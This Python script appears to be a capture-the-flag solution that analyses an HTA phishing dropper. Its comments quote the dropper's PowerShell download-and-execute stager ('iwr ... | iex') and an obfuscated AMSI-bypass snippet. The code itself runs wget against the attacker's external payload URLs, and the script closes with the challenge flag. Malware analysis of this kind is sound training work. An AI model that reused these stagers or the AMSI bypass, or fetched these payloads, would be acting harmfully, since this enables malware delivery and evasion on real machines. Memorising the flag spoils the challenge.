import subprocess

# Company Discount
# Difficulty: Easy

# I got this email about a new company discount!
# Seems like an amazing perk - check it out yourself!

# Note: This challenge might trigger your antivirus. Although "defanged" and completely safe
# to run, please always treat malware/unknown challenges like this as real and use a
# sandbox such as a VM or Windows Sandbox

comments = '''
  A security analysis utility that inspects an HTA dropper file,
  simulates the execution of its embedded PowerShell stagers,
  fetches remote payloads bypassing AMSI patching, and logs the downloaded artifacts
'''

tags = '''
  #hta #powershell #amsi-bypass #malware-analysis #dropper #wget
'''

class Py_testing:
  def main():
    subprocess.run('cat Brunnerne_Employee_Discount_Newsletter_2026.hta', shell=True)

    # var c = "powershell.exe -w minimized /c 'iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b | iex'";
    # new ActiveXObject('WScript.Shell').Run(c);

    subprocess.run('wget https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b', shell=True)
    subprocess.run('cat 1ca729e6-5081-48da-a9b5-c1b8c21b433b', shell=True)

    # $senior = "{0}{6}{4}{5}{3}{1}{2}{7}" -f $district,$actuary,$expense,$assemble,$group,$amass,$gather,$corporate
    # $lead = $flow."GeTfIELd"("a"+"MsiIN"+"iTfAi"+"le"+"D", $senior)
    # $lead.setVaLUE($null,$true)
    # $follower = iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7

    subprocess.run('wget https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7', shell=True)
    subprocess.run('cat 1ca729e6-5081-48da-a9b5-c1b8c21b433b', shell=True)

    # Flag => brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}

if __name__ == '__main__':
  Py_testing.main()
